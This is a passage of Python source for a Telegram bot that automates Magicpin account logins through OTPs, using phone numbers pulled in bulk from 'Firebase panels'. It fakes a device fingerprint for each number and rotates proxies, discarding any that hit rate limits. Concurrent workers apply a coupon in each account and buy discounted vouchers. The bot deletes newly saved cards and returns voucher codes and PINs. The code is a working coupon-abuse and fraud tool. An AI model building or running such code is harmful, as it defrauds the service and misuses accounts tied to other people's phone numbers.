            f"✅ Completed      : <b>{c}/{t}</b>\n"
            f"📵 Numbers used   : <b>{u}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Bot is idle. Press /start to run again.",
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    # Fetch ALL phones from ALL panels at once — big enough buffer
    n_panels = len(RUNTIME["firebase_urls"])
    used     = BATCH.get("used_phones") or set()
    fetch_n  = max(target * 6, 200)   # generous buffer so queue never starves

    await _safe_reply(
        message,
        f"📦 <b>{workers}</b> workers · target <b>{remaining}</b> remaining\n"
        f"📋 Panel cursor: <b>{BATCH.get('panel_index', 0) + 1}/{n_panels}</b> · "
        f"used: <b>{len(used)}</b>\n"
        f"⏳ Fetching phones via FinFin Engine…",
        parse_mode="HTML",
    )

    phones, next_panel = await asyncio.to_thread(
        fetch_phones_from_panels,
        RUNTIME["firebase_urls"],
        fetch_n,
        BATCH.get("panel_index", 0),
        used,
    )
    BATCH["panel_index"] = next_panel

    if not phones:
        BATCH["active"] = False
        await _safe_reply(
            message,
            f"🚫 <b>No more numbers available.</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📋 Panels scanned : <b>{min(next_panel, n_panels)}/{n_panels}</b>\n"
            f"📵 Numbers used   : <b>{len(used)}</b>\n"
            f"✅ Completed      : <b>{completed}/{target}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"All panels exhausted. Add more or reset used_numbers.txt.",
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    for phone, _, _ in phones:
        used.add(phone)
    BATCH["used_phones"] = used

    panel_set = sorted({
        RUNTIME["firebase_urls"].index(u) + 1
        for _, _, u in phones
        if u in RUNTIME["firebase_urls"]
    })

    await _safe_reply(
        message,
        f"🚀 Starting <b>{workers}</b> workers "
        f"({len(phones)} numbers loaded from panel(s) {panel_set}).\n"
        f"Workers pull continuously — no rounds.",
        parse_mode="HTML",
    )
    return await _run_batch_streaming(
        message, context, mode, workers, phones, RUNTIME["proxies"][:]
    )


async def receive_target(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        return ConversationHandler.END

    text = (update.message.text or "").strip()
    try:
        n = int(text)
        if n < 1 or n > 500:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Enter a number between 1 and 500:")
        return WAITING_TARGET

    mode = context.user_data.get("mode", 1)

    if not RUNTIME["firebase_urls"]:
        await update.message.reply_text(
            "⚠️ No Firebase panels — manual single run.\n"
            "📱 Send the 10-digit phone number:",
        )
        return WAITING_PHONE_MANUAL

    if BATCH.get("active") and BATCH.get("bg_task") and not BATCH["bg_task"].done():
        await update.message.reply_text(
            "⚠️ A batch is already running in the background.\n"
            "Wait for it to finish, or /cancel and /start."
        )
        return MAIN_MENU

    BATCH["active"] = True
    BATCH["stop"] = False
    BATCH["mode"] = mode
    BATCH["target"] = n
    BATCH["completed"] = 0
    BATCH["results"] = {}
    BATCH["paid"] = set()
    BATCH["workers_finished"] = False
    BATCH["used_phones"] = set()
    BATCH["panel_index"] = 0

    await update.message.reply_text(
        f"🎯 Target: <b>{n}</b> | Workers: <b>{RUNTIME.get('workers', 3)}</b>\n"
        f"Mode: <b>{mode}</b>\n"
        f"📋 Panels: sequential (1 → 2 → …, no reuse)\n"
        f"⚙️ Running in <b>background</b> — bot stays responsive.",
        parse_mode="HTML",
    )
    _schedule_next_batch(update.message, context)
    return WAITING_BATCH_PAID


async def receive_phone_manual(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        return ConversationHandler.END

    phone = normalize_phone(update.message.text or "")
    if not (len(phone) == 12 and phone.startswith("91")):
        await update.message.reply_text("❌ Invalid. Send 10 digits or 91XXXXXXXXXX:")
        return WAITING_PHONE_MANUAL

    context.user_data["phone"] = phone
    device = generate_device(phone)
    context.user_data["device"] = device

    # Random proxy from pool — rotates every manual attempt so no single proxy
    # gets hammered across multiple manual runs
    good_proxies = PROXY_POOL.all_good()
    proxy = random.choice(good_proxies) if good_proxies else (
        RUNTIME["proxies"][0] if RUNTIME["proxies"] else None
    )
    context.user_data["proxy"] = proxy
    proxies = proxy_dict(proxy)

    await update.message.reply_text(
        f"📱 <code>{phone}</code>\n"
        f"📱 {device['name']}\n"
        f"🔀 Proxy: <code>{proxy or 'none'}</code>\n\n"
        "⏳ Sending OTP…",
        parse_mode="HTML",
    )

    success, rate_limited, fingerprint = send_otp(phone, base_headers(), proxies=proxies)
    if rate_limited:
        PROXY_POOL.mark_bad(proxy, "manual otp rate limited")
        await update.message.reply_text(
            f"⚠️ Proxy rate-limited — blacklisted.\nSend the number again to retry with a different proxy."
        )
        return WAITING_PHONE_MANUAL
    if not success:
        await update.message.reply_text("❌ OTP send failed.")
        return MAIN_MENU

    # Store fingerprint — login MUST use same ver/ua or it 401s
    context.user_data["otp_fingerprint"] = fingerprint
    await update.message.reply_text("✉️ OTP sent. Reply with the digits:")
    return WAITING_OTP_MANUAL


async def receive_otp_manual(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not allowed(update):
        return ConversationHandler.END

    otp = re.sub(r"\D", "", update.message.text or "")
    if not otp:
        await update.message.reply_text("❌ Empty OTP. Try again:")
        return WAITING_OTP_MANUAL

    phone  = context.user_data["phone"]
    device = context.user_data["device"]
    proxies = proxy_dict(context.user_data.get("proxy"))

    await update.message.reply_text("⏳ Logging in…")
    fingerprint = context.user_data.get("otp_fingerprint") or {}
    d = login(phone, otp, base_headers(), device, proxies=proxies, fingerprint=fingerprint)

    # Guard: login() returns a dict even on failure — check status explicitly
    if not d or d.get("status") != "SUCCESS" or not d.get("access_token"):
        err = ""
        if d:
            err = d.get("_error") or d.get("message") or d.get("status") or ""
        reason = f": {err}" if err else ""
        await update.message.reply_text(
            f"❌ Login failed{reason}.\n"
            "Wrong OTP or account issue. Send /start to try again."
        )
        return MAIN_MENU

    token = d["access_token"]
    uid   = str(d["user_id"])
    phone = d.get("phone_number") or phone
    context.user_data["token"] = token
    context.user_data["uid"] = uid
    context.user_data["phone"] = phone

    mode = context.user_data.get("mode", 1)
    if mode == 1:
        await update.message.reply_text("🔍 Fetching voucher…")
        numeric, _ = ledger_newest_voucher_txn(token, uid, min_txn_id=0, proxies=proxies)
        if not numeric:
            await update.message.reply_text("❌ No BOUGHT voucher.")
            return MAIN_MENU
        voucher = fetch_voucher_by_numeric(numeric, token, uid, proxies=proxies)
        if voucher:
            await update.message.reply_text(
                "🎟️ <b>Voucher Ready</b>\n\n"
                f"🏬 {voucher['merchant']}\n"
                f"💰 {voucher['value']}\n"
                f"🔑 <code>{voucher['code']}</code>\n"
                f"🔒 <code>{voucher['pin']}</code>",
                parse_mode="HTML",
                reply_markup=main_keyboard(),
            )
        else:
            await update.message.reply_text("❌ Voucher fetch failed.")
        return MAIN_MENU

    keyboard = [
        [
            InlineKeyboardButton("PhonePe", callback_data="upi_m_phonepe"),
            InlineKeyboardButton("Paytm",   callback_data="upi_m_paytm"),
        ]
    ]
    await update.message.reply_text(
        "💳 Pick UPI app:",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return WAITING_UPI


async def upi_chosen_manual(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return ConversationHandler.END

    instrument = "Phonepe" if "phonepe" in query.data else "Paytm"
    await query.edit_message_text(f"✅ UPI: <b>{instrument}</b>\n\n⏳ Checkout…", parse_mode="HTML")

    token  = context.user_data["token"]
    uid    = context.user_data["uid"]
    phone  = context.user_data["phone"]
    device = context.user_data["device"]
    proxies = proxy_dict(context.user_data.get("proxy"))

    cards_before = list_saved_card_ids(token, uid, proxies=proxies)
    # ledger_newest_voucher_txn returns (numeric_id, raw_card) — the numeric IS
    # the highest bought txn id so use it directly as the baseline watermark.
    _base_numeric, _ = ledger_newest_voucher_txn(token, uid, min_txn_id=0, proxies=proxies)
    base_txn_id = int(_base_numeric) if _base_numeric else 0
    context.user_data["cards_before"] = cards_before
    context.user_data["base_txn_id"]  = base_txn_id
    # Persist panel info so paid_done can use it for pending-generation poller
    context.user_data["device_id"]    = context.user_data.get("device_id")
    context.user_data["firebase_url"] = context.user_data.get("firebase_url")

    _, pg_amt = checkout(phone, token, uid, FIRST_NAME, EMAIL, device, proxies=proxies)
    if pg_amt is None:
        await query.message.reply_text("❌ Checkout failed.")
        return MAIN_MENU

    # Coupon didn't apply — full price, tell user and skip
    if pg_amt >= 5.0:
        mark_used_persistent(phone)
        await query.message.reply_text(
            f"⚠️ Coupon did not apply for <code>{phone}</code> (pgAmt=₹{pg_amt:.2f}).\n"
            f"Account may have already used this voucher.",
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    txn = payoutapp(phone, token, uid, FIRST_NAME, EMAIL, amount=pg_amt,
                    device=device, proxies=proxies)
    if not txn:
        await query.message.reply_text("❌ Payoutapp failed.")
        return MAIN_MENU

    context.user_data["txn"] = txn
    # Try chosen instrument first, fall back if gateway rejects
    _inst_fallback = [instrument] + [i for i in ["Phonepe", "paytm", "gpay"] if i != instrument]
    uri = None
    used_instrument = instrument
    for _inst in _inst_fallback:
        uri = initiate_upi(txn, uid, phone, EMAIL, amount=pg_amt,
                           instrument=_inst, proxies=proxies)
        if uri:
            used_instrument = _inst
            break
        log.warning(f"Manual UPI {_inst} returned no URI — trying next")
    if not uri:
        await query.message.reply_text("❌ No UPI URI — all instruments failed.")
        return MAIN_MENU
    instrument = used_instrument

    caption = (
        f"💰 <b>AMOUNT: ₹{pg_amt:.2f}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💸 <b>Scan to pay</b> · {instrument}\n"
        f"After paying, tap the button."
    )
    keyboard = [[InlineKeyboardButton("✅ I have paid", callback_data="paid_done")]]

    qr_buf = make_qr_bytes(uri)
    manual_photo_sent = False
    if qr_buf:
        for _attempt in range(3):
            qr_buf.seek(0)
            try:
                await asyncio.wait_for(
                    query.message.reply_photo(
                        photo=qr_buf,
                        caption=caption,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(keyboard),
                    ),
                    timeout=20.0,
                )
                manual_photo_sent = True
                break
            except asyncio.TimeoutError:
                log.warning(f"manual QR photo timeout (attempt {_attempt + 1}/3)")
                await asyncio.sleep(2 ** _attempt)
            except Exception as e:
                log.warning(f"manual QR photo failed (attempt {_attempt + 1}/3): {e}")
                await asyncio.sleep(2 ** _attempt)

    if not manual_photo_sent:
        uri_line = f"\n\n🔗 <code>{uri}</code>" if uri else ""
        await query.message.reply_text(
            caption + uri_line + "\n\n⚠️ QR image unavailable — copy link above to pay.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    return WAITING_DONE


async def paid_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    if not allowed(update):
        return ConversationHandler.END

    # QR is sent as a photo — edit_message_text crashes on photo messages.
    try:
        if query.message and query.message.photo:
            await query.edit_message_caption(caption="👍 Waiting 20 s for settle…")
        else:
            await query.edit_message_text("👍 Waiting 20 s for settle…")
    except Exception as e:
        log.warning(f"paid_done edit error (non-fatal): {e}")

    await asyncio.sleep(20)

    # Guard: token/uid may be missing if bot restarted between QR and payment
    token = context.user_data.get("token")
    uid   = context.user_data.get("uid")
    if not token or not uid:
        await query.message.reply_text(
            "⚠️ Session expired (bot restarted?).\n"
            "Use 💾 Saved → find your number → 🔄 Relogin & fetch.",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    proxies      = proxy_dict(context.user_data.get("proxy"))
    cards_before = context.user_data.get("cards_before", set())
    base_txn_id  = context.user_data.get("base_txn_id", 0)
    txn          = context.user_data.get("txn", "")
    phone        = context.user_data.get("phone", "?")
    device_id    = context.user_data.get("device_id")
    firebase_url = context.user_data.get("firebase_url")

    # Clean up saved cards
    try:
        cards_after = await asyncio.to_thread(list_saved_card_ids, token, uid, proxies)
        new_cards = cards_after - set(cards_before)
        for cid in new_cards:
            await asyncio.to_thread(delete_card, cid, token, uid, proxies)
    except Exception as e:
        log.warning(f"paid_done card cleanup error (non-fatal): {e}")

    await query.message.reply_text("🔍 Polling ledger…")
    numeric = await asyncio.to_thread(
        poll_new_voucher, token, uid, base_txn_id, 180, 4, proxies
    )

    if not numeric:
        await query.message.reply_text(
            "❌ No new voucher found yet.\n"
            "If you paid, use 💾 Saved → 🔄 Relogin & fetch in a few minutes.",
            reply_markup=main_keyboard(),
        )
        return MAIN_MENU

    voucher = await asyncio.to_thread(
        fetch_voucher_by_numeric, numeric, token, uid, txn, proxies
    )

    if not voucher:
        await query.message.reply_text("❌ Voucher fetch failed.", reply_markup=main_keyboard())
        return MAIN_MENU

    # Pending generation — launch background poller instead of showing dash
    if voucher.get("pending_generation") and not voucher.get("complete"):
        await query.message.reply_text(
            f"⏳ <b>Magicpin is still generating your code…</b>\n"
            f"📱 <code>{phone}</code>\n"
            f"I'll message you automatically when it's ready.",
            parse_mode="HTML",
            reply_markup=main_keyboard(),
        )
        r = {
            "token": token, "uid": uid, "txn": txn,
            "proxies": proxies, "phone": phone,
            "device_id": device_id, "firebase_url": firebase_url,
        }
        sid = secrets.token_hex(4)
        asyncio.create_task(_poll_until_voucher_ready(
            query.message, sid, numeric, token, uid, txn,
            proxies, phone, r, None,
        ))
        return MAIN_MENU

    # Normal path
    await query.message.reply_text(
        "🎟️ <b>Voucher Ready</b>\n\n"
        f"🏬 {voucher.get('merchant', '-')}\n"
        f"💰 {voucher.get('value', '-')}\n"
        f"🔑 <code>{voucher.get('code', '-')}</code>\n"
        f"🔒 <code>{voucher.get('pin', '-')}</code>",
        parse_mode="HTML",
        reply_markup=main_keyboard(),
    )
    return MAIN_MENU


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    BATCH["stop"] = True
    BATCH["active"] = False
    task = BATCH.get("bg_task")
    if task and not task.done():
        task.cancel()
    if update.message:
        await update.message.reply_text(
            "❌ Cancelled. Background batch stopped.\n"
            "Saved sessions are kept (💾 Saved).",
            reply_markup=main_keyboard(),
        )
    context.user_data.clear()
    return MAIN_MENU


async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message:
        await update.message.reply_text(
            "Use the buttons or /start",
            reply_markup=main_keyboard(),
        )
    return MAIN_MENU


def main():
    log.info("Starting Magicpin Telegram Bot with FinFin Engine…")
    load_config()
    _FB.ensure()  # FIX: ensure pool is sized on startup
    app = (
        Application.builder()
        .token(TG_TOKEN)
        .concurrent_updates(True)
        .build()
    )

    async def go_menu_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
        q = update.callback_query
        await q.answer()
        if not allowed(update):
            return
        try:
            await q.edit_message_text(
                "🚀 <b>Magicpin Bot</b>\n\n" + status_text(),
                parse_mode="HTML",
                reply_markup=main_keyboard(),
            )
        except Exception:
            await q.message.reply_text(
                status_text(), parse_mode="HTML", reply_markup=main_keyboard()
            )

    app.add_handler(CallbackQueryHandler(paid_callback, pattern=r"^paid:"))
    app.add_handler(CallbackQueryHandler(session_fetch_callback, pattern=r"^sv:"))
    app.add_handler(CallbackQueryHandler(relogin_callback, pattern=r"^rl:"))
    app.add_handler(CallbackQueryHandler(session_firebase_info_callback, pattern=r"^sf:"))
    app.add_handler(CallbackQueryHandler(session_delete_callback, pattern=r"^sd:"))
    app.add_handler(CallbackQueryHandler(session_open_callback, pattern=r"^so:"))
    app.add_handler(CallbackQueryHandler(session_page_callback, pattern=r"^sp:"))
    app.add_handler(CallbackQueryHandler(show_saved_callback, pattern=r"^show_saved$"))
    app.add_handler(CallbackQueryHandler(go_menu_cb, pattern=r"^go_menu$"))
    app.add_handler(CallbackQueryHandler(main_menu_callback, pattern=r"^clear_sessions$"))

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MAIN_MENU: [
                CallbackQueryHandler(main_menu_callback),
            ],
            ADDING_PROXY: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_proxies),
                CommandHandler("cancel", cancel),
            ],
            SETTING_FIREBASE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_firebase),
                CommandHandler("cancel", cancel),
            ],
            SETTING_WORKERS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_workers),
                CommandHandler("cancel", cancel),
            ],
            WAITING_TARGET: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_target),
                CommandHandler("cancel", cancel),
            ],
            WAITING_PHONE_MANUAL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone_manual),
                CommandHandler("cancel", cancel),
            ],
            WAITING_OTP_MANUAL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_otp_manual),
                CommandHandler("cancel", cancel),
            ],
            WAITING_UPI: [
                CallbackQueryHandler(upi_chosen_manual, pattern="^upi_m_"),
                CommandHandler("cancel", cancel),
            ],
            WAITING_DONE: [
                CallbackQueryHandler(paid_done, pattern="^paid_done$"),
                CommandHandler("cancel", cancel),
            ],
            WAITING_BATCH_PAID: [
                CallbackQueryHandler(paid_callback, pattern=r"^paid:"),         # FIX 2: button was blocked by conv state
                CallbackQueryHandler(session_fetch_callback, pattern=r"^sv:"),  # FIX 2: same
                CommandHandler("cancel", cancel),
            ],
        },
        fallbacks=[
            CommandHandler("cancel", cancel),
            CommandHandler("start", start),
            CallbackQueryHandler(paid_callback, pattern=r"^paid:"),         # FIX 3: safety net for every state
            CallbackQueryHandler(session_fetch_callback, pattern=r"^sv:"),  # FIX 3: same
            MessageHandler(filters.ALL, fallback),
        ],
        allow_reentry=True,
    )

    app.add_handler(conv)
    log.info("Bot is polling…")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()